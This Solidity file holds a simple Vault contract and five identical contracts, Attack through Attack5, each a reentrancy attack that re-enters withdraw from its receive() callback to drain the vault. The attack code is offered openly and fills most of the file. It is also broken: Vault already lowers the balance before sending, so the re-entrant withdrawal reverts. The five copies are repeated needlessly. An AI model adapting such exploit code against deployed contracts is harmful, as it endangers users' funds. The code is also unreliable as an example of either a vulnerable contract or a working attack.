 // SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Vault {
    address public owner;
    mapping(address => uint256) public balance;

    constructor() {
        owner = msg.sender;
    }

    function deposit() external payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balance[msg.sender] >= amount, "Insufficient balance");
        balance[msg.sender] -= amount;
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "Transfer failed");
    }

    function sweep() external {
        require(msg.sender == owner, "Not owner");
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "Sweep failed");
    }
}
contract Attack {
    Vault public vault;

    constructor(address _vault) {
        vault = Vault(_vault);
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }

    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw(1);
        }
    }
}
contract Attack2 {
    Vault public vault;

    constructor(address _vault) {
        vault = Vault(_vault);
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }

    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw(1);
        }
    }
}
contract Attack3 {
    Vault public vault;

    constructor(address _vault) {
        vault = Vault(_vault);
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }

    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw(1);
        }
    }
}
contract Attack4 {
    Vault public vault;

    constructor(address _vault) {
        vault = Vault(_vault);
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }

    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw(1);
        }
    }
}
contract Attack5 {
    Vault public vault;

    constructor(address _vault) {
        vault = Vault(_vault);
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }

    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw(1);
        }
    }
}